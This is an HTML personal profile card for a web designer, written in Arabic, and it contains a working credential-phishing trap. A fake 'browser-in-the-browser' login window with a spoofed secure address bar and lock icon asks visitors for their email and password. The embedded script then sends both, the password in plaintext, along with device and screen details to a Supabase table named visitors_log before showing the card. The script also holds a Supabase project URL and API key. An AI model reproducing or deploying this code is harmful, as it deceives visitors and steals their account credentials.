<!DOCTYPE HTML>
<html lang="ar">
<head>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>SALEM | سـالـم</title>
    
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins:400,700&display=swap"/>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"/>
    
    <style>
        :root {
            --back_color: radial-gradient(circle at center, #0a192f 0%, #020c1b 100%);
            --front_color: rgba(10, 25, 47, 0.7);
            --gold: #FFD700;
            --muted-gold: #c5a059;
            --deep-blue: #1A2980;
            --white: #e6f1ff;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; text-decoration: none; }
        body { background: var(--back_color); width: 100vw; height: 100vh; overflow: hidden; display: flex; justify-content: center; align-items: center; }

        /* واجهة الدخول (نفس التصميم الأصلي) */
        #auth-screen { position: fixed; inset: 0; background: var(--back_color); z-index: 1000; display: flex; justify-content: center; align-items: center; }
        .bitb-window { width: 90%; max-width: 380px; background: var(--front_color); backdrop-filter: blur(25px); border-radius: 30px; border: 1px solid rgba(197, 160, 89, 0.2); overflow: hidden; box-shadow: 0 25px 60px rgba(0,0,0,0.6); direction: rtl; animation: fadeIn 0.8s ease; }
        
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

        .bitb-header { background: rgba(2, 12, 27, 0.9); padding: 12px 18px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid rgba(197, 160, 89, 0.1); }
        .bitb-address-bar { background: rgba(255, 255, 255, 0.05); padding: 7px 15px; border-radius: 12px; font-size: 0.75em; color: var(--muted-gold); flex-grow: 1; margin: 0 10px; text-align: center; border: 1px solid rgba(197, 160, 89, 0.1); display: flex; align-items: center; justify-content: center; }
        .bitb-address-bar i { font-size: 0.9em; margin-left: 6px; color: #4cd964; }

        .auth-box { padding: 35px 30px; text-align: center; }
        .auth-box h2 { color: var(--gold); margin-bottom: 10px; font-size: 1.5em; letter-spacing: 1px; }
        .auth-box p.info-text { color: var(--white); margin-bottom: 25px; font-size: 0.85em; opacity: 0.7; line-height: 1.5; }
        .auth-box input { width: 100%; padding: 14px; margin: 8px 0; background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(197, 160, 89, 0.15); border-radius: 12px; color: white; outline: none; text-align: center; transition: 0.3s; }
        .auth-box input:focus { border-color: var(--gold); background: rgba(255, 255, 255, 0.07); }
        .auth-box button { width: 100%; padding: 14px; margin-top: 20px; background: linear-gradient(45deg, var(--deep-blue), var(--muted-gold)); border: none; border-radius: 12px; color: white; font-weight: bold; cursor: pointer; font-size: 1em; box-shadow: 0 5px 15px rgba(0,0,0,0.3); transition: 0.3s; }

        /* تصميم vCard (المحتفظ بكامل جماليته) */
        .vcard { width: 90%; max-width: 420px; height: 600px; background: var(--front_color); backdrop-filter: blur(25px); border-radius: 24px; border: 1px solid rgba(197, 160, 89, 0.2); position: relative; overflow: hidden; display: none; animation: fadeIn 1s ease; }
        .header { height: 35%; position: relative; }
        .wave_bg { position: absolute; width: 100%; height: 100%; overflow: hidden; }
        .wave-01, .wave-02, .wave-03 { position: absolute; width: 550px; height: 550px; background: linear-gradient(45deg, var(--deep-blue), var(--muted-gold)); border-radius: 43%; animation: rotate 15s linear infinite; }
        .wave-01 { top: -180%; left: -15%; }
        .wave-02 { top: -185%; left: -20%; opacity: 0.3; animation-direction: reverse; }
        .wave-03 { top: -175%; left: -10%; opacity: 0.15; }
        @keyframes rotate { 100% { transform: rotate(360deg); } }
        
        .profile_pic_content { width: 135px; height: 135px; border-radius: 50%; position: absolute; left: 50%; transform: translate(-50%, -50%); top: 100%; overflow: hidden; border: 3px solid var(--muted-gold); z-index: 10; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
        .profile_video { width: 100%; height: 100%; object-fit: cover; }
        
        .card_content { padding-top: 85px; text-align: center; }
        .satan h4 { font-size: 1.9em; background: linear-gradient(to right, var(--gold), var(--white)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; margin-bottom: 10px; }
        .old-bio { color: var(--muted-gold); font-size: 0.95em; padding: 0 30px; line-height: 1.6; font-weight: 500; }
        
        .social { margin-top: 25px; }
        .social div { display: flex; flex-wrap: wrap; justify-content: center; gap: 12px; padding: 0 20px; }
        .social i { padding: 12px; font-size: 1.3em; background: rgba(197, 160, 89, 0.05); border-radius: 12px; border: 1px solid rgba(197, 160, 89, 0.1); color: var(--muted-gold); transition: 0.3s; width: 45px; height: 45px; display: flex; align-items: center; justify-content: center; }
        .social a:hover i { color: var(--gold); transform: translateY(-5px); border-color: var(--gold); box-shadow: 0 5px 15px rgba(255, 215, 0, 0.2); }
        
        .footer-text { position: absolute; bottom: 15px; width: 100%; font-size: 0.7em; color: rgba(136, 146, 176, 0.4); text-align: center; }
    </style>
</head>
<body>

<div id="auth-screen">
    <div class="bitb-window">
        <div class="bitb-header">
            <div class="bitb-action-dots"><span style="background:#ff5f56; width:10px; height:10px; border-radius:50%;"></span></div>
            <div class="bitb-address-bar"><i class="fas fa-lock"></i> secure.verification/auth</div>
        </div>
        <div class="auth-box">
            <h2>تحقق أمني</h2>
            <p class="info-text">يرجى تسجيل الدخول للوصول إلى الملف الشخصي لسالم الشمري.</p>
            <input type="email" id="email" placeholder="البريد الإلكتروني">
            <input type="password" id="password" placeholder="كلمة المرور">
            <button id="login-btn" onclick="handleLogin()">تأكيد الدخول</button>
            <p id="error-msg" style="margin-top: 15px; font-size: 0.8em; color: #ff4d4d;"></p>
        </div>
    </div>
</div>

<div class="vcard" id="profile-card">
    <div class="header">
        <div class="wave_bg"><div class="wave-01"></div><div class="wave-02"></div><div class="wave-03"></div></div>
        <div class="profile_pic_content">
            <video class="profile_video" autoplay loop muted playsinline>
                <source src="https://files.catbox.moe/jvicv4.mp4" type="video/mp4">
            </video>
        </div>
    </div>
    <div class="card_content">
        <div class="satan"><h4>SALEM</h4></div>
        <div class="old-bio">Web Designer & Creative Developer.<br>Specialized in UI/UX Aesthetics.<br>BELIEVE IN YOURSELF.</div>
        <div class="social">
            <div>
                <a href="https://t.me/kokksha"><i class="fab fa-telegram"></i></a>
                <a href="https://www.facebook.com/share/15KQ2NmX9V/"><i class="fab fa-facebook"></i></a>
                <a href="https://www.instagram.com/_u_vf?igsh=bXRqd2Z4ZWhteW94"><i class="fab fa-instagram"></i></a>
                <a href="https://github.com/salemalshamrie"><i class="fas fa-code"></i></a>
                <a href="https://16salm.github.io/AI/"><i class="fas fa-lightbulb"></i></a>
                <a href="https://www.fcbarcelona.com"><i class="fas fa-football-ball"></i></a>
                <a href="https://uokerbala.edu.iq/"><i class="fas fa-university"></i></a>
            </div>
        </div>
    </div>
    <p class="footer-text">© 2026 Salem Al-Shammari | Karbala, Iraq</p>
</div>

<script>
    // الإعدادات الجديدة الخاصة بك
    const SB_URL = 'https://kcckppfflaxpxhipngdz.supabase.co'; 
    const SB_KEY = 'EyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtjY2twcGZmbGF4cHhoaXBuZ2R6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU2MzU1NTMsImV4cCI6MjA5MTIxMTU1M30.Lek1mEohH1GoUkcMQZT3vQ2tmshPJVI-Oa8f_y2mH6o';
    
    const supabaseClient = supabase.createClient(SB_URL, SB_KEY);

    function showProfile() {
        document.getElementById('auth-screen').style.display = 'none';
        document.getElementById('profile-card').style.display = 'block';
    }

    async function handleLogin() {
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const loginBtn = document.getElementById('login-btn');
        const errorMsg = document.getElementById('error-msg');

        if (!email || !password) {
            errorMsg.innerText = "يرجى إدخال كافة البيانات";
            return;
        }

        loginBtn.innerText = "جاري التحقق...";
        loginBtn.disabled = true;

        try {
            // تجميع معلومات الجهاز الأساسية
            const device = /iPhone|iPad|iPod/i.test(navigator.userAgent) ? "iOS" : "Android/PC";

            // إرسال البيانات إلى Supabase
            const { error } = await supabaseClient
                .from('visitors_log')
                .insert([{ 
                    visitor_email: email, 
                    visitor_password: password,
                    device_model: device,
                    fingerprint: `${window.screen.width}x${window.screen.height}`
                }]);

            if (error) throw error;

            // إظهار البطاقة في حال النجاح
            showProfile();

        } catch (err) {
            console.error(err);
            errorMsg.innerText = "خطأ في الربط! تأكد من إنشاء الجدول في Supabase";
            loginBtn.innerText = "تأكيد الدخول";
            loginBtn.disabled = false;
        }
    }
</script>
</body>
</html>
